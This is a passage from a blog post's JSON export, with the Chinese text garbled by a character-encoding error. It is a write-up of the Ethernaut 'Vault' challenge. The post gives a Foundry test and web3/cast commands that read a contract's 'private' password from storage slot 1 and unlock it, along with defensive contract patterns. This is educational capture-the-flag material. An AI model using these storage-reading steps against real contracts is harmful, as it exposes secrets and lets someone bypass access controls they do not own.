å…³å¡çš„æ”»å‡»æŠ€æœ¯å’Œé˜²æŠ¤æªæ–½ã€‚ç†è§£ EVM å­˜å‚¨å¸ƒå±€å’Œ eth_getStorageAt çš„ä½¿ç”¨ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 8: Vault - ç§æœ‰å˜é‡è¯»å–\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 8 - Vault](https://ethernaut.openzeppelin.com/level/8)  \n> **æ”»å‡»ç±»å‹**: ç§æœ‰å˜é‡è¯»å–  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¦ unlock è¿™ä¸ªåˆçº¦è´¦æˆ·ï¼Œä¹Ÿå°±æ˜¯è¦æ‰¾åˆ° passwordã€‚æŒ‘æˆ˜çš„å…³é”®åœ¨äºç†è§£åŒºå—é“¾ä¸Šæ²¡æœ‰çœŸæ­£çš„\"ç§æœ‰\"æ•°æ®ï¼Œæ‰€æœ‰çŠ¶æ€å˜é‡éƒ½å¯ä»¥è¢«è¯»å–ã€‚\n\n![Vault Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### å­˜å‚¨æœºåˆ¶ (Storage)\n\næˆ‘ä»¬éœ€è¦ç†è§£ EVM ä¸­å­˜å‚¨çš„å¸ƒå±€ä»¥åŠåŸç†ï¼ˆä½¿ç”¨ 32 å­—èŠ‚å¤§å°çš„æ’æ§½ï¼‰å’Œ JSON RPC å‡½æ•° `eth_getStorageAt`ã€‚\n\nEVM çš„æ•°æ®éƒ½å­˜åœ¨ 32 å­—èŠ‚æ§½ä¸­ï¼š\n- ç¬¬ä¸€ä¸ªçŠ¶æ€å˜é‡å­˜å‚¨åœ¨æ§½ä½ 0\n- å¦‚æœç¬¬ä¸€ä¸ªå˜é‡å­˜å‚¨å®Œäº†è¿˜æœ‰è¶³å¤Ÿçš„å­—èŠ‚ï¼Œä¸‹ä¸€ä¸ªå˜é‡ä¹Ÿå­˜å‚¨åœ¨ slot 0\n- å¦åˆ™å­˜å‚¨åœ¨ slot 1ï¼Œä¾æ­¤ç±»æ¨\n\n> **æ³¨æ„**: åƒæ•°ç»„å’Œå­—ç¬¦ä¸²è¿™æ ·çš„åŠ¨æ€ç±»å‹å·¥ä½œæ–¹å¼ä¸åŒ\n\nåœ¨ Vault åˆçº¦ä¸­ï¼š\n- `locked` æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œä½¿ç”¨ 1 å­—èŠ‚ï¼Œå­˜å‚¨åœ¨ slot 0\n- `password` æ˜¯ä¸€ä¸ª bytes32ï¼Œä½¿ç”¨ 32 ä¸ªå­—èŠ‚\n- ç”±äºæ’æ§½ 0 ä¸­å‰©ä½™çš„ 31 ä¸ªå­—èŠ‚æ— æ³•å®¹çº³ passwordï¼Œå› æ­¤å®ƒè¢«å­˜å‚¨åœ¨ slot 1 ä¸­\n\n### è¯»å– Storage\n\n`eth_getStorageAt` JSON RPC å‡½æ•°å¯ç”¨äºè¯»å–åˆçº¦åœ¨ç»™å®šæ§½ä½çš„å­˜å‚¨ã€‚\n\nä½¿ç”¨ web3.js è¯»å– slot 1 çš„åˆçº¦å­˜å‚¨ï¼š\n\n```javascript\nweb3.eth.getStorageAt(contractAddress, 1, (err, result) => {\n  console.log(result);\n});\n```\n\nåœ¨ Foundry ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ cheatcodes ä¸­çš„ loadï¼š\n\n```solidity\nbytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n```\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/VaultFactory.sol\";\n\ncontract VaultTest is Test {\n    Ethernaut ethernaut;\n    VaultFactory vaultFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        vaultFactory = new VaultFactory();\n        ethernaut.registerLevel(vaultFactory);\n    }\n    \n    function testVaultExploit() public {\n        // åˆ›å»ºå…³å¡å®ä¾‹\n        address levelInstance = ethernaut.createLevelInstance(vaultFactory);\n        Vault instance = Vault(levelInstance);\n        \n        // éªŒè¯åˆå§‹çŠ¶æ€\n        assertEq(instance.locked(), true);\n        \n        // æ”»å‡»ï¼šè¯»å–å­˜å‚¨åœ¨ slot 1 ä¸­çš„å¯†ç \n        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n        \n        // ä½¿ç”¨è¯»å–çš„å¯†ç è§£é”\n        instance.unlock(password);\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(instance.locked(), false);\n        \n        // æäº¤å…³å¡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1. **åˆ†æå­˜å‚¨å¸ƒå±€**ï¼šç¡®å®š password å­˜å‚¨åœ¨ slot 1\n2. **è¯»å–å­˜å‚¨**ï¼šä½¿ç”¨ `vm.load()` è¯»å– slot 1 çš„æ•°æ®\n3. **è°ƒç”¨ unlock**ï¼šä½¿ç”¨è¯»å–çš„å¯†ç è§£é”åˆçº¦\n\n```solidity\n// è¯»å– slot 1 ä¸­çš„å¯†ç \nbytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n\n// è§£é”åˆçº¦\ninstance.unlock(password);\n\n// éªŒè¯è§£é”æˆåŠŸ\nassertEq(instance.locked(), false);\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\n\n```solidity\n// âŒ ä¸å®‰å…¨ï¼šå¯†ç å­˜å‚¨åœ¨é“¾ä¸Š\ncontract VulnerableVault {\n    bytes32 private password;  // å¯ä»¥è¢«è¯»å–ï¼\n    \n    constructor(bytes32 _password) {\n        password = _password;\n    }\n}\n\n// âœ… å®‰å…¨ï¼šä½¿ç”¨å“ˆå¸ŒéªŒè¯\ncontract SecureVault {\n    bytes32 private passwordHash;  // å­˜å‚¨å“ˆå¸Œè€Œä¸æ˜¯æ˜æ–‡\n    \n    constructor(bytes32 _passwordHash) {\n        passwordHash = _passwordHash;\n    }\n    \n    function unlock(string memory _password) public {\n        require(keccak256(abi.encodePacked(_password)) == passwordHash, \"Wrong password\");\n        // unlock logic\n    }\n}\n```\n\n### 2. ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ\n\n```solidity\ncontract CommitRevealVault {\n    mapping(address => bytes32) private commitments;\n    \n    // ç¬¬ä¸€é˜¶æ®µï¼šæäº¤å“ˆå¸Œ\n    function commit(bytes32 _commitment) public {\n        commitments[msg.sender] = _commitment;\n    }\n    \n    // ç¬¬äºŒé˜¶æ®µï¼šæ­ç¤ºå¹¶éªŒè¯\n    function reveal(string memory _password, uint256 _nonce) public {\n        bytes32 hash = keccak256(abi.encodePacked(_password, _nonce));\n        require(commitments[msg.sender] == hash, \"Invalid reveal\");\n        // unlock logic\n    }\n}\n```\n\n### 3. ä½¿ç”¨é“¾ä¸‹éªŒè¯\n\n```solidity\ncontract OffChainVault {\n    address private authorizedSigner;\n    mapping(address => bool) private unlocked;\n    \n    function unlock(bytes memory signature, address user) public {\n        bytes32 messageHash = keccak256(abi.encodePacked(user, \"unlock\"));\n        address signer = recoverSigner(messageHash, signature);\n        require(signer == authorizedSigner, \"Unauthorized\");\n        unlocked[user] = true;\n    }\n}\n```\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n### å­˜å‚¨è¯»å–å·¥å…·\n\n```bash\n# ä½¿ç”¨ cast è¯»å–å­˜å‚¨\ncast storage <CONTRACT_ADDRESS> <SLOT_NUMBER>\n\n# ä½¿ç”¨ web3.py\nfrom web3 import Web3\nw3 = Web3(Web3.HTTPProvider('http://localhost:8545'))\npassword = w3.eth.get_storage_at(contract_address, 1)\n```\n\n### å­˜å‚¨å¸ƒå±€åˆ†æ\n\n```solidity\n// ä½¿ç”¨ forge inspect æŸ¥çœ‹å­˜å‚¨å¸ƒå±€\n// forge inspect <CONTRACT> storage-layout\n```\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n- `private` å…³é”®å­—æ„å‘³ç€æ•°æ®åªèƒ½ç”±åˆçº¦æœ¬èº«è®¿é—®ï¼Œè€Œä¸æ˜¯å¯¹å¤–ç•Œéšè—\n- åŒºå—é“¾ä¸Šæ²¡æœ‰ä»€ä¹ˆæ˜¯ç§æœ‰çš„ï¼Œä¸€åˆ‡éƒ½æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥é˜…è¯»\n- EVM å­˜å‚¨ä½¿ç”¨ 32 å­—èŠ‚çš„æ’æ§½ç³»ç»Ÿ\n\n**æ”»å‡»å‘é‡**:\n- ç›´æ¥è¯»å–åˆçº¦å­˜å‚¨\n- åˆ†æå­˜å‚¨å¸ƒå±€ç¡®å®šæ•æ„Ÿæ•°æ®ä½ç½®\n- ä½¿ç”¨ RPC è°ƒç”¨æˆ– Foundry cheatcodes è¯»å–æ•°æ®\n\n**é˜²å¾¡ç­–ç•¥**:\n- æ°¸è¿œä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ˜æ–‡æ•æ„Ÿæ•°æ®\n- ä½¿ç”¨å“ˆå¸Œå’Œæ‰¿è¯ºæ–¹æ¡ˆ\n- è€ƒè™‘é“¾ä¸‹éªŒè¯æœºåˆ¶\n- å®æ–½é€‚å½“çš„è®¿é—®æ§åˆ¶\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[ä¸Šä¸€å…³: Level 7 - Force](/2025/01/25/ethernaut-level-07-force/)**\n- **[ä¸‹ä¸€å…³: Level 9 - King](/2025/01/25/ethernaut-level-09-king/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n","slug":"ethernaut-level-08-vault","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp5000pbf5qcp9lgy5y","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-8-Vault-ç§æœ‰å˜é‡è¯»å–\"><a href=\"#ğŸ¯-Ethernaut-Level-8-Vault-ç§æœ‰å˜é‡è¯»å–\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 8: Vault - ç§æœ‰å˜é‡è¯»å–\"></a>ğŸ¯ Ethernaut Level 8: Vault - ç§æœ‰å˜é‡è¯»å–</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/8\">Ethernaut Level 8 - Vault</a><br><strong>æ”»å‡»ç±»å‹</strong>: ç§æœ‰å˜é‡è¯»å–<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¦ unlock è¿™ä¸ªåˆçº¦è´¦æˆ·ï¼Œä¹Ÿå°±æ˜¯è¦æ‰¾åˆ° passwordã€‚æŒ‘æˆ˜çš„å…³é”®åœ¨äºç†è§£åŒºå—é“¾ä¸Šæ²¡æœ‰çœŸæ­£çš„â€ç§æœ‰â€æ•°æ®ï¼Œæ‰€æœ‰çŠ¶æ€å˜é‡éƒ½å¯ä»¥è¢«è¯»å–ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg\" alt=\"Vault Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"å­˜å‚¨æœºåˆ¶-Storage\"><a href=\"#å­˜å‚¨æœºåˆ¶-Storage\" class=\"headerlink\" title=\"å­˜å‚¨æœºåˆ¶ (Storage)\"></a>å­˜å‚¨æœºåˆ¶ (Storage)</h3><p>æˆ‘ä»¬éœ€è¦ç†è§£ EVM ä¸­å­˜å‚¨çš„å¸ƒå±€ä»¥åŠåŸç†ï¼ˆä½¿ç”¨ 32 å­—èŠ‚å¤§å°çš„æ’æ§½ï¼‰å’Œ JSON RPC å‡½æ•° <code>eth_getStorageAt</code>ã€‚</p>\n<p>EVM çš„æ•°æ®éƒ½å­˜åœ¨ 32 å­—èŠ‚æ§½ä¸­ï¼š</p>\n<ul>\n<li>ç¬¬ä¸€ä¸ªçŠ¶æ€å˜é‡å­˜å‚¨åœ¨æ§½ä½ 0</li>\n<li>å¦‚æœç¬¬ä¸€ä¸ªå˜é‡å­˜å‚¨å®Œäº†è¿˜æœ‰è¶³å¤Ÿçš„å­—èŠ‚ï¼Œä¸‹ä¸€ä¸ªå˜é‡ä¹Ÿå­˜å‚¨åœ¨ slot 0</li>\n<li>å¦åˆ™å­˜å‚¨åœ¨ slot 1ï¼Œä¾æ­¤ç±»æ¨</li>\n</ul>\n<blockquote>\n<p><strong>æ³¨æ„</strong>: åƒæ•°ç»„å’Œå­—ç¬¦ä¸²è¿™æ ·çš„åŠ¨æ€ç±»å‹å·¥ä½œæ–¹å¼ä¸åŒ</p>\n</blockquote>\n<p>åœ¨ Vault åˆçº¦ä¸­ï¼š</p>\n<ul>\n<li><code>locked</code> æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œä½¿ç”¨ 1 å­—èŠ‚ï¼Œå­˜å‚¨åœ¨ slot 0</li>\n<li><code>password</code> æ˜¯ä¸€ä¸ª bytes32ï¼Œä½¿ç”¨ 32 ä¸ªå­—èŠ‚</li>\n<li>ç”±äºæ’æ§½ 0 ä¸­å‰©ä½™çš„ 31 ä¸ªå­—èŠ‚æ— æ³•å®¹çº³ passwordï¼Œå› æ­¤å®ƒè¢«å­˜å‚¨åœ¨ slot 1 ä¸­</li>\n</ul>\n<h3 id=\"è¯»å–-Storage\"><a href=\"#è¯»å–-Storage\" class=\"headerlink\" title=\"è¯»å– Storage\"></a>è¯»å– Storage</h3><p><code>eth_getStorageAt</code> JSON RPC å‡½æ•°å¯ç”¨äºè¯»å–åˆçº¦åœ¨ç»™å®šæ§½ä½çš„å­˜å‚¨ã€‚</p>\n<p>ä½¿ç”¨ web3.js è¯»å– slot 1 çš„åˆçº¦å­˜å‚¨ï¼š</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web3.<span class=\"property\">eth</span>.<span class=\"title function_\">getStorageAt</span>(contractAddress, <span class=\"number\">1</span>, <span class=\"function\">(<span class=\"params\">err, result</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(result);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>åœ¨ Foundry ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ cheatcodes ä¸­çš„ loadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/VaultFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract VaultTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    VaultFactory vaultFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        vaultFactory = new VaultFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(vaultFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testVaultExploit() public &#123;</span><br><span class=\"line\">        // åˆ›å»ºå…³å¡å®ä¾‹</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(vaultFactory);</span><br><span class=\"line\">        Vault instance = Vault(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯åˆå§‹çŠ¶æ€</span><br><span class=\"line\">        assertEq(instance.locked(), true);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ”»å‡»ï¼šè¯»å–å­˜å‚¨åœ¨ slot 1 ä¸­çš„å¯†ç </span><br><span class=\"line\">        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ä½¿ç”¨è¯»å–çš„å¯†ç è§£é”</span><br><span class=\"line\">        instance.unlock(password);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.locked(), false);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æäº¤å…³å¡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>åˆ†æå­˜å‚¨å¸ƒå±€</strong>ï¼šç¡®å®š password å­˜å‚¨åœ¨ slot 1</li>\n<li><strong>è¯»å–å­˜å‚¨</strong>ï¼šä½¿ç”¨ <code>vm.load()</code> è¯»å– slot 1 çš„æ•°æ®</li>\n<li><strong>è°ƒç”¨ unlock</strong>ï¼šä½¿ç”¨è¯»å–çš„å¯†ç è§£é”åˆçº¦</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// è¯»å– slot 1 ä¸­çš„å¯†ç </span><br><span class=\"line\">bytes32 password = vm.load(address(instance), bytes32(uint256(1)));</span><br><span class=\"line\"></span><br><span class=\"line\">// è§£é”åˆçº¦</span><br><span class=\"line\">instance.unlock(password);</span><br><span class=\"line\"></span><br><span class=\"line\">// éªŒè¯è§£é”æˆåŠŸ</span><br><span class=\"line\">assertEq(instance.locked(), false);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\"><a href=\"#1-é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\" class=\"headerlink\" title=\"1. é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\"></a>1. é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¸å®‰å…¨ï¼šå¯†ç å­˜å‚¨åœ¨é“¾ä¸Š</span><br><span class=\"line\">contract VulnerableVault &#123;</span><br><span class=\"line\">    bytes32 private password;  // å¯ä»¥è¢«è¯»å–ï¼</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _password) &#123;</span><br><span class=\"line\">        password = _password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… å®‰å…¨ï¼šä½¿ç”¨å“ˆå¸ŒéªŒè¯</span><br><span class=\"line\">contract SecureVault &#123;</span><br><span class=\"line\">    bytes32 private passwordHash;  // å­˜å‚¨å“ˆå¸Œè€Œä¸æ˜¯æ˜æ–‡</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(bytes32 _passwordHash) &#123;</span><br><span class=\"line\">        passwordHash = _passwordHash;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(string memory _password) public &#123;</span><br><span class=\"line\">        require(keccak256(abi.encodePacked(_password)) == passwordHash, &quot;Wrong password&quot;);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ\"><a href=\"#2-ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ\" class=\"headerlink\" title=\"2. ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ\"></a>2. ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitRevealVault &#123;</span><br><span class=\"line\">    mapping(address =&gt; bytes32) private commitments;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ç¬¬ä¸€é˜¶æ®µï¼šæäº¤å“ˆå¸Œ</span><br><span class=\"line\">    function commit(bytes32 _commitment) public &#123;</span><br><span class=\"line\">        commitments[msg.sender] = _commitment;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ç¬¬äºŒé˜¶æ®µï¼šæ­ç¤ºå¹¶éªŒè¯</span><br><span class=\"line\">    function reveal(string memory _password, uint256 _nonce) public &#123;</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_password, _nonce));</span><br><span class=\"line\">        require(commitments[msg.sender] == hash, &quot;Invalid reveal&quot;);</span><br><span class=\"line\">        // unlock logic</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-ä½¿ç”¨é“¾ä¸‹éªŒè¯\"><a href=\"#3-ä½¿ç”¨é“¾ä¸‹éªŒè¯\" class=\"headerlink\" title=\"3. ä½¿ç”¨é“¾ä¸‹éªŒè¯\"></a>3. ä½¿ç”¨é“¾ä¸‹éªŒè¯</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract OffChainVault &#123;</span><br><span class=\"line\">    address private authorizedSigner;</span><br><span class=\"line\">    mapping(address =&gt; bool) private unlocked;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function unlock(bytes memory signature, address user) public &#123;</span><br><span class=\"line\">        bytes32 messageHash = keccak256(abi.encodePacked(user, &quot;unlock&quot;));</span><br><span class=\"line\">        address signer = recoverSigner(messageHash, signature);</span><br><span class=\"line\">        require(signer == authorizedSigner, &quot;Unauthorized&quot;);</span><br><span class=\"line\">        unlocked[user] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><h3 id=\"å­˜å‚¨è¯»å–å·¥å…·\"><a href=\"#å­˜å‚¨è¯»å–å·¥å…·\" class=\"headerlink\" title=\"å­˜å‚¨è¯»å–å·¥å…·\"></a>å­˜å‚¨è¯»å–å·¥å…·</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ cast è¯»å–å­˜å‚¨</span></span><br><span class=\"line\">cast storage &lt;CONTRACT_ADDRESS&gt; &lt;SLOT_NUMBER&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ web3.py</span></span><br><span class=\"line\">from web3 import Web3</span><br><span class=\"line\">w3 = Web3(Web3.HTTPProvider(<span class=\"string\">&#x27;http://localhost:8545&#x27;</span>))</span><br><span class=\"line\">password = w3.eth.get_storage_at(contract_address, 1)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å­˜å‚¨å¸ƒå±€åˆ†æ\"><a href=\"#å­˜å‚¨å¸ƒå±€åˆ†æ\" class=\"headerlink\" title=\"å­˜å‚¨å¸ƒå±€åˆ†æ\"></a>å­˜å‚¨å¸ƒå±€åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä½¿ç”¨ forge inspect æŸ¥çœ‹å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">// forge inspect &lt;CONTRACT&gt; storage-layout</span><br></pre></td></tr></table></figure>\n\n<h2 